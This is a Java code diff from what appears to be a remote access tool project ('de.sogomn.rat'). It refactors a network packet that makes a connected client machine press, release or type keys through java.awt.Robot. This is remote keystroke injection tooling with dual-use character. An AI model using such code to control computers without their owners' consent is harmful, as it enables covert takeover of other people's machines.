@@ -9,39 +9,44 @@ import de.sogomn.rat.ActiveClient;
 public final class KeyEventPacket implements IPacket {
 	
 	private int key;
-	private boolean flag;
+	private byte strokeType;
+	
+	public static final byte PRESS = 0;
+	public static final byte RELEASE = 1;
+	public static final byte TYPE = 2;
 	
 	public KeyEventPacket() {
 		key = KeyEvent.VK_UNDEFINED;
 	}
 	
-	public KeyEventPacket(final int key, final boolean flag) {
+	public KeyEventPacket(final int key, final byte strokeType) {
 		this.key = key;
-		this.flag = flag;
+		this.strokeType = strokeType;
 	}
 	
 	@Override
 	public void send(final ActiveClient client) {
-		final byte flagByte = (byte)(flag ? 1 : 0);
-		
 		client.writeInt(key);
-		client.writeByte(flagByte);
+		client.writeByte(strokeType);
 	}
 	
 	@Override
 	public void receive(final ActiveClient client) {
 		key = client.readInt();
-		flag = client.readByte() == 1;
+		strokeType = client.readByte();
 	}
 	
 	@Override
-	public void execute() {
+	public void execute(final ActiveClient client) {
 		try {
 			final Robot rob = new Robot();
 			
-			if (flag) {
+			if (strokeType == PRESS) {
 				rob.keyPress(key);
-			} else {
+			} else if (strokeType == RELEASE) {
+				rob.keyRelease(key);
+			} else if (strokeType == TYPE) {
+				rob.keyPress(key);
 				rob.keyRelease(key);
 			}
 		} catch (final IllegalArgumentException ex) {
